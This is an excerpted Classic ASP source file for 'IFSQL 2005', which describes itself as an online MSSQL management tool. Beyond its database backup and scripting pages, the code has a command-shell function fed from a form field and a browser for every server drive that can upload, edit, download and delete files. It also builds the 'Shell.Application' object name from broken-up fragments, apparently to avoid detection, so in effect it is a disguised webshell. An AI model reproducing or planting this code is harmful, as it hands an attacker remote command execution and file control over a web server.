...
Sub LoginValidate()
	...
	if strPass = strPassword and strUser = "" then
...
Sub LoginForm()
	Response.write ("<br><br><br>" & _
	  ...
	  "  <tr bgcolor=""#FFFFFF"">" & _
	  "    <td nowrap>登录密码：</td>" & _
	  "    <td><input name=""Password"" type=""Password"" id=""Password""></td>" & _
	  "  </tr>" & _
	  "  <tr bgcolor=""#FFFFFF"">" & _
...
Sub HtmlHeader()
	Response.Write ("<HTML><HEAD>" & vbnewline & _
	 "<TITLE>"& AppName & " " & AppVersion & " -- " & ServerIP & "</TITLE>" & vbnewline & _
...
<%
  Response.Write ("<table width=""100%"" id=""LeftMenu"" height=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"" align=""left"" >" & vbnewline & _
	...
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=backup"">数据库备份和恢复</a></td></tr>" & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=buildscript"">生成SQL脚本</a></td></tr>" & vbnewline & _
	"  </table>" & vbnewline & _
	"  </td></tr>" & vbnewline & _
	"<tr><td class=""menutitle"">文件操作" & vbnewline & _
	"  <table width=""120"" border=""0"" cellpadding=""0"" cellspacing=""0"">" & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=listfile"">浏览文件</a></td></tr>" & vbnewline & _
...
Sub WelCome
	Response.Write ("<br><br><br>" & _
	 ...
	 "<TR bgcolor=""#F2F2F2"">" & _
	 "<TD><strong>欢迎使用IFSQL 2005</strong></TD>" & _
	 "</TR>" & _
	 "<TR bgcolor=""#FFFFFF"">" & _
	 "<TD>IFSQL 2005是一款在线管理MSSQL数据库的工具，通过WEB的方式轻松远程管理的数据库！！ <br><br>" & _
	 "IFSQL 2005源代码公开，您可以自由传播和修改，但不得将之用于盈利或非盈利性的商业用途。" & _
	 "</TD></TR>" & _
	 "</TABLE>	")
End Sub
...
Sub UpdateRecord	
	...
	Conn.execute(sSQL)
	if err.number <> 0 then
		ShowMessageBox("保存数据字段时发生错误。<BR><BR>错误描述: " & Err.Description) 
	Else
		ShowMessageBox("成功保存数据：" & sTable & "." & sField & "<BR><BR><a href='?action==listrec&field="&sField&"&table=" & sTable &"'>点击这里继续</a>") 
	end if	
	on error goto 0
	CloseDB	
End Sub
...
Sub AddRecord
	...
	Conn.execute(sSQL)
	if err.number <> 0 then
		ShowMessageBox("添加数据字段时发生错误。<BR><BR>错误描述: " & Err.Description) 
	Else
		ShowMessageBox("成功添加数据：" & sTable & "." & sField & "<BR><BR><a href='?action==listrec&field="&sField&"&table=" & sTable &"'>点击这里继续</a>") 
	end if		
	on error goto 0
	CloseDB
End Sub
...
Sub EditRecords()
	...
	"<TABLE width=""90%"" BORDER=""0"" CELLPADDING=""4"" CELLSPACING=""1"" BGCOLOR=""#CCCCCC"" align=center>" & _
	"<TR><TD colspan="""& rs.fields.count &""" bgcolor=""#F2F2F2""><strong>添加、修改记录</strong></TD></TR>")
...
Sub BackupDB()
	...
	Response.Write ( "<br>" & _
	 "<table width=""80%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
	 "<form name=""dbform"" action=""?action=dobackup"" method=""post"">" & _
	 "<tr bgcolor=""#F1F1F1"">" & _
	 "<td colspan=2><strong>备份数据库</strong></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td>选择操作：</td>" & _	 
	 "<td>" & _	 
	 "<INPUT TYPE=""radio"" NAME=""act"" id=""act_backup""  value=""backup"" checked><label for=act_backup>备份</label>" & _
	 "<INPUT TYPE=""radio"" NAME=""act"" id=""act_restore"" value=""restore""><label for=act_restore>恢复</label> " & _
	 "</td>" & _
	 "</tr> " & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td>数据库名：</td>" & _
	 "<td><INPUT TYPE=""text"" NAME=""databasename"" value="""&DbName&"""></td>" & _	 
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td>文件路径：</td>" & _
	 "<td><INPUT TYPE=""text"" NAME=""bak_file"" value=""c:\"&DbName&".bak"">(备份或恢复的文件路径)</td>" & _
	 "</tr>" & _	 
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td>用户名：</td>" & _
	 "<td><INPUT TYPE=""text"" NAME=""name"" value="""&DbUid&""">(sql的登陆名)</td>" & _	 
	 "</tr>" & _	 	 	 
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td>密  码：</td>" & _
	 "<td><INPUT TYPE=""text"" NAME=""pass"" value="""&DbPwd&""">(sql的登陆密码)</td>" & _	 
	 "</tr>" & _	 
	 "<tr bgcolor=""#FFFFFF""><td  colspan=2>" & _
	 "<input name=""todo"" type=""hidden"" value=""yes"">" & _
	 "<input name=""btnBackup"" type=""submit"" value="" 执 行 "">" & _
	 "</td>" & _
	 "</tr>" & _
	 "</form>" 	 & _  	  
	 "</table><br>")
...
Sub DoBackupDB()
	dim sqlserver,sqlname,sqlpassword,sqlLoginTimeout,databasename,bak_file,act,srv,bak
	dim Files
	GetDBCookie()
	sqlserver = DBServer 'sql服务器
	sqlname = trim(request("name"))   '用户名
	sqlpassword = trim(request("pass")) '密码
	...
	if databasename = "" then
	   ShowMessageBox("input database name")
	else
	  if act = "backup" then
		  ...
		  bak.SQLBackup srv
		  if err.number>0 then
		     ShowMessageBox(err.description)
		  end if
		  ShowMessageBox "备份成功!"
	  ...
	  rest.SQLRestore srv	  
	  ShowMessageBox "<font color=green>恢复成功!</font>"
	 else
	    ShowMessageBox "<font color=red>没有选择操作</font>"
	 end if
	end if
End Sub
...
Function CmdShell()
  ...
  If Request.Form("cmd")<>"" Then  
	  ...
	  SI=SI&aaa 
  End If
  SI=SI&chr(13)&"Rar命令行压缩：c:\progra~1\winrar\rar.exe a -r d:\web\test\web1.rar d:\web\test\web1</textarea><br>"
	...
	Response.write ("<br><br>" & _
	 ...
	 if strKeyword <> "" then 
		...
		Response.write ("<br>" & _
		 ...
		 "<form name=""searchfileform"" action=""?action=searchfile"" method=""post"">" & _
		 "<tr bgcolor=""#F1F1F1"">" & _
		 "<td width=""100%""><strong>搜索结果</strong></td>" & _
		 "</tr>" & _
		 "<tr bgcolor=""#FFFFFF"">" & _
		 "<td width=""100%"">如下文件符合 <font color=red>" & strKeyword & "</font> 关键字：")
...
sub GetDriveList()	
	...
	for each list in fso.drives
		driveStr=driveStr&"<a href=""?action=listfile&thePath="&list.driveLetter&":\"">"&list.driveLetter&"盘:</a> "
	next
	Response.Write ( "<br>" & _
	 "<table width=""90%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
	 "<tr bgcolor=""#F1F1F1"">" & _
	 "<td>系统盘符："&driveStr&"</td>" & _
	 "</tr>" & _
	 "</table><br>")		
end sub
...
sub GetFolderList(thePath)
	dim sa,ext,flag,list,folders,theHref, tmpObj,DEfd
	dim strshow
	tmpObj = "S"&DEfd&"he"&DEfd&"ll.App"&DEfd&"li"&DEfd&"cation" 
	
	set sa=server.createObject(tmpObj)
	...
	if getParentFolder(thePath)<>"" then
		strshow = strshow & "&nbsp;<a href=""?action=listfile&thePath="&encodeForUrl(getParentFolder(thePath),false)&""">..</a><br>"
	end if

	on error resume next
	for each list in folders.items
		if list.isfolder Then
			strshow = strshow &  "<a href=""?action=listfile&thePath="&encodeForUrl(list.path,false)&""">["
			strshow = strshow &  replace(replace(lcase(list.path),lcase(thePath),""),"\","")
			strshow = strshow &  "]</a><br>"
		end if	
	next
	for each list in folders.items		
		if (not list.isfolder) Then
			ext=split(list.path,".")(uBound(split(list.path,".")))
			flag=instr(lcase(editableFileExt),lcase("$"&ext&"$"))
			strshow = strshow & "<table width='100%' cellpadding='0' cellspacing='0' style='font-size:12px'><tr>"
			if instr(lcase(list.path),lcase(server.mapPath("/"))) then
				...
				strshow = strshow &  "<td width='70%'><a href=""/"&theHref&""" target=_blank>"&replace(replace(lcase(list.path),lcase(thePath),""),"\","")&"</td>"
			 else
				strshow = strshow &  "<td width='70%'>"&replace(replace(lcase(list.path),lcase(thePath),""),"\","") & "</td>"
			end if
			strshow = strshow & "<td width='10%'>" & getTheSize(list.size) & "</td>"
			strshow = strshow &  "<td width='20%'><a href=""?action=downfile&thepath=" & encodeForUrl(list.path, False) & """>Down</a>"
			if flag>0 then
				strshow = strshow &  "&nbsp;&nbsp;<a target='_blank' href=""?action=editfile&thepath=" & encodeForUrl(list.path, False) & """>Edit</a>"
			end if
			strshow = strshow &  "&nbsp;&nbsp;<a onClick=""if(confirm('确定要删除吗？一经删除，将不可恢复！')){return true;}else{return false;}"" href=""?action=deletefile&thepath=" & encodeForUrl(list.path, False) & """>Delete</a>"
			strshow = strshow &  "</tr></table>"
		end if
	next
	Response.Write ("<table width=""90%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
	 "<tr bgcolor=""#F1F1F1""><td>当前目录：<a href=""?action=listfile&thepath="&encodeForUrl(thePath, false)&""">"&thePath&"</a></td></tr>" & _
	 "<tr bgcolor=""#FFFFFF""><td>"&strshow&"</td></tr>" & _
	 "</table><br>")			
	if err then
		ShowMessageBox(err.description)
	end if	 
...
sub ListFiles()
	...
	GetDriveList()
	dim theDefaultFileName
	if right(thePath,1) = "\" then
		theDefaultFileName = thePath & "test.asp"
	else
		theDefaultFileName = thePath & "\test.asp"
	end if
	Response.Write ("<table width=""90%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
	 "<form method=""post"" enctype=""multipart/form-data"" action=""?action=uploadfile&thePath="&encodeForUrl(thePath, false)&""">" & _
	 "<tr bgcolor=""#F1F1F1""><td><strong>文件上传</strong></td></tr>" & _
	 "<tr bgcolor=""#FFFFFF""><td>请选择上传文件：<input name=""file"" type=""file"" size=""30""></td></tr>" & _	 
	 "<tr bgcolor=""#FFFFFF""><td>文件保存为：<input name=""filename"" value="""&theDefaultFileName&""" type=""text"" >&nbsp;<input type=""checkbox"" name=""writeMode"" value=""True"">覆盖模式 " &_
	 "<input name=""Submit"" type=""submit""  value=""上 传"" onClick=""this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;""> " & _	
	 "</td></tr>" & _	 
	 "</form></table><br>")			
	GetFolderList thePath
	Set fso = nothing
end sub
...
sub EditFiles()
	...
	Response.Write ("<br><table width=""700""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
	 "<tr bgcolor=""#F1F1F1""><td>当前文件：<input name=""thePath"" type=""text"" value="""&thePath&"""  style=""width:600px""></td></tr>" & _
	 "<tr bgcolor=""#FFFFFF""><td><textarea name=""fileContent"" rows=""25"" style=""width:700px"">" & server.htmlEncode(theFile.readAll()) & _
	 "</textarea></td></tr>" & _
	 "</table><br>")			
...
sub UploadFiles()
	dim theFile,overWrite,fileName
...
sub DeleteFiles()
	...
	if fso.FileExists(thePath) then
		...
		set fso = nothing
		if err.number =0 then
			ShowMessageBox("成功删除文件" & thePath)
		end if		
	else
		ShowMessageBox("指定的文件" & thePath & "不存在")	
	end if	
	if err.number <> 0 then
		ShowMessageBox(err.description)
	end if			
...
sub GenerateSQLScript
	GetDBCookie()
	dim param, sqldb,srv,tbl,ToDo,sqlScript, strTable, isSelect
	ToDo = Trim(Request.Form("todo"))
	strTable = Trim(Request.Form("tablename"))
	param = 73756
	Set srv=Server.CreateObject("SQLDMO.SQLServer")
	srv.LoginTimeout = 50
	srv.Connect DBServer,DBUid, DBPwd
	Set sqldb = srv.Databases(DBName)
	Set tbl=Server.CreateObject("SQLDMO.Table")
	
	Response.Write ( "<br>" & _
	 "<table width=""80%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
	 "<form name=""dbform"" action=""?action=buildscript"" method=""post"">" & _
	 "<tr bgcolor=""#F1F1F1"">" & _
	 "<td colspan=2><strong>生成SQL脚本</strong></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td>数据库名：</td>" & _
	 "<td>"& DbName & "</td>" & _	 
	 ...
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td>资料表：</td>" & _
	 "<td><select name=""tablename""><option value=""1"">全部</option>")
	  For Each tbl In sqldb.Tables
		If Not tbl.SystemObject Then
		  if tbl.Name = strTable then isSelect = "selected" else isSelect = ""
		  response.write("<OPTION value="""&tbl.name&""" "& isSelect &">" & tbl.Name & "</OPTION>")
		  if ToDo = "yes" then
			  if strTable = "1" then
				 sqlScript = sqlScript & tbl.Script(param)
			  else
				 if tbl.Name = strTable then
					sqlScript = tbl.Script(param)
				end if
			  end if
		  else
		      sqlScript = ""				  
	 ...
	 "<tr bgcolor=""#FFFFFF""><td  colspan=2>" & _
	 "<input name=""todo"" type=""hidden"" value=""yes"">" & _
	 "<input name=""btnBackup"" type=""submit"" value="" 生成脚本 "">" & _
	 "</td>" & _
	 "</tr>" & _
	 "</form>" 	 & _  	  
	 "</table><br>")
	 ...
	 if sqlScript <> "" then
		Response.Write ("<table width=""80%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
		 "<form name=""dbform"" action=""?action=buildscript"" method=""post"">" & _
		 "<tr bgcolor=""#F1F1F1"">" & _
		 "<td><strong>生成的脚本</strong></td>" & _
		 "</tr>" & _	 
		 "<tr bgcolor=""#F1F1F1"">" & _
		 "<td><textarea style=""width:100%;height:300px"">"&sqlScript&"</textarea></td>" & _
		 "</tr>" & _	 	 
		 "</table>")
	 end if
...
if sAction <> "downfile" and sAction <> "dbsrcset" then	
	Call HtmlHeader()	
	Select Case sAction
		...
		Case "listfile"      : Call ListFiles
		Case "editfile"      : Call EditFiles 
		Case "uploadfile"    : Call UploadFiles		
		Case "deletefile"    : Call DeleteFiles
		Case "backup"        : Call BackupDB
		Case "dobackup"      : Call DoBackupDB
		Case "buildscript"   : Call GenerateSQLScript
		Case Else            : Call LoginForm	
	End Select		
	Call HtmlFooter()
else
	
	if sAction = "dbsrcset" then
		Call DataSrcSetting
	else	
		Call DownloadFiles
	end if
